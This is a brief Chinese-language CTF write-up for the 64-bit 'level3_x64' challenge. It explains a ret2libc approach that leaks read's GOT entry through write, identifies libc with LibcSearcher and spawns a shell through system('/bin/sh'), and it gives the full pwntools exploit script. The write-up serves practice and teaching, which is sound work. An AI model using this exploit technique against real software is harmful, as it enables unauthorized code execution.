和level3基本一样，就是变成了64位程序

也是和前面ret2libc类似，主要还是需要pop这样的gadget

但是问题在于泄漏基地址时write需要三个参数，在64位中是rdi、rsi、rdx三个寄存器中

本来应该对这里面每一个寄存器都赋值的，但是这里有一点就是在执行这个到返回之前有调用这样一个write的过程

![image-20201124204045507](https://static.hack1s.fun/images/2021/02/06/image-20201124204045507.png)

这个过程的第三个参数是`0x200`，也就是说这是rdx的值肯定是大于8的，所以我们可以直接拿来用，不经过原本的修改



那么就只需要找pop rdi 和pop rsi的gadget了

![image-20201124204212562](https://static.hack1s.fun/images/2021/02/06/image-20201124204212562.png)

用到这两个

```python
from pwn import *
from LibcSearcher import *

io = remote('node3.buuoj.cn',26580)
#io = process('./level3_x64')
elf = ELF('./level3_x64')

io.recvuntil('Input:\n')

payload = b'a'*0x80 + b'b'*0x8 + p64(0x4006b3) + p64(1) + p64(0x4006b1) + p64(elf.got['read'])*2 + p64(elf.sym['write']) + p64(elf.sym['vulnerable_function'])
io.send(payload)

real_read = u64(io.recv(8))
libc = LibcSearcher('read',real_read)

libc_base = real_read - libc.dump('read')

payload = b'a'*0x80 + b'b'*0x8 + p64(0x4006b3) + p64(libc_base + libc.dump('str_bin_sh')) + p64(libc_base + libc.dump('system'))
io.send(payload)

io.interactive()
```

